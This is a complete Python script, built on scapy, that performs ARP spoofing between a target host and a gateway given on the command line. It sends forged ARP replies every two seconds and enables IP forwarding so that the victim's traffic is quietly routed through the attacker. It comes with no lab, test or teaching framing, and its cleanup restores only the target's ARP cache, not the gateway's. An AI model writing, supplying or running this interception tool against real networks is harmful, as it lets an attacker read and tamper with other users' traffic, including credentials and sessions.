import time, os, argparse
from scapy.all import ARP, Ether, srp, send

class PrecisionInterceptor:
    def __init__(self, target, gw):
        self.target, self.gw = target, gw
        self.t_mac = self._get_mac(target)
        self.g_mac = self._get_mac(gw)

    def _get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        return ans[0][1].hwsrc if ans else None

    def poison(self):
        send(ARP(op=2, pdst=self.target, hwdst=self.t_mac, psrc=self.gw), verbose=False)
        send(ARP(op=2, pdst=self.gw, hwdst=self.g_mac, psrc=self.target), verbose=False)

    def restore(self):
        send(ARP(op=2, pdst=self.target, hwdst=self.t_mac, psrc=self.gw, hwsrc=self.g_mac), count=5, verbose=False)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target"); parser.add_argument("--gateway")
    args = parser.parse_args()
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    atk = PrecisionInterceptor(args.target, args.gateway)
    try:
        while True: atk.poison(); time.sleep(2)
    except KeyboardInterrupt: atk.restore()